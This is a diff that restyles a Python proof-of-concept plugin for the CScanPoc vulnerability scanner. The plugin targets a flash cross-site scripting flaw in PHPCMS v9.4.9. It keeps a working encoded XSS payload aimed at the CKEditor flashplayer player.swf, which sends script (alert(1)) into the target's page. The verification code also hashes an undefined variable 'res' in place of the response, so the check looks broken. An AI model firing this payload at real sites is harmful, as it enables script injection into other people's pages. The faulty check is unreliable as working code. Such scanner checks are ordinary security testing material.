@@ -2,13 +2,16 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re,urllib,md5
+import re
+import urllib
+import md5
+
 
 class Vuln(ABVuln):
-    vuln_id = 'PHPCMS_0004' # 平台漏洞编号，留空
+    vuln_id = 'PHPCMS_0004'  # 平台漏洞编号，留空
     name = 'PHPCMS v9.4.9 flash xss'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.XSS # 漏洞类型
+    type = VulnType.XSS  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         PHPCMS v9.4.9 flash xss漏洞。
@@ -18,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'PHPCMS'  # 漏洞应用名称
     product_version = 'v9.4.9'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '0444fa97-557e-4e4e-9561-e815c2296182'
@@ -31,11 +35,12 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-                    
+
             md5_check_value = 'cf00b069e36e756705c49b3a3bf20c40'
-            payload = urllib.unquote("/statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf%26stream%3D%5C%2522%29%29%7Dcatch%28e%29%7Balert%281%29%7D%2f%2f")
+            payload = urllib.unquote(
+                "/statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf%26stream%3D%5C%2522%29%29%7Dcatch%28e%29%7Balert%281%29%7D%2f%2f")
             #code, head, res, errcode, _ = curl.curl(url+payload)
-            #print(payload)
+            # print(payload)
             r = requests.get(self.target + payload)
             if r.status_code == 200:
                 md5_buff = md5.new(res).hexdigest()
@@ -49,6 +54,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
